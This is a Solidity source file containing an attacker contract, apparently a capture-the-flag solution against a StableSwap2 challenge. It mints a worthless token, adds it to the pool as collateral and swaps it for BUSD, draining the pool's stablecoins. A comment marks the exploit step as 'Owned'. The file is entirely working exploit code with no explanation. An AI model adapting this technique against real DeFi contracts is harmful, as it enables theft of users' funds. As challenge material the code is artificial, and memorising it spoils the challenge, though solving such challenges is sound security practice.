pragma solidity 0.8.0;

import "./Setup.sol";
import "hardhat/console.sol";

contract PeterisPrieditisAttacker {

    constructor(Setup instance) payable {
        ERC20 USDC = instance.USDC();
        ERC20 BUSD = instance.BUSD();
        StableSwap2 SSwap = StableSwap2(instance.instance());
        ERC20PresetFixedSupply solverToken = new ERC20PresetFixedSupply("SolverToken Stablecoin","STKS",100000,address(this));
        solverToken.transfer(address(SSwap), 10000);

        instance.faucet(1000);
        USDC.approve(address(SSwap), type(uint256).max);

        uint256[] memory amounts = new uint256[](3);
        amounts[0] = 1000;
        amounts[1] = 0;
        amounts[2] = 0;

        SSwap.mint(amounts);
        SSwap.donate(1); // Owned

        SSwap.addCollateral(address(solverToken));
        solverToken.approve(address(SSwap), type(uint256).max);
        SSwap.swap(address(solverToken), 9995, address(BUSD));

    }
    
}
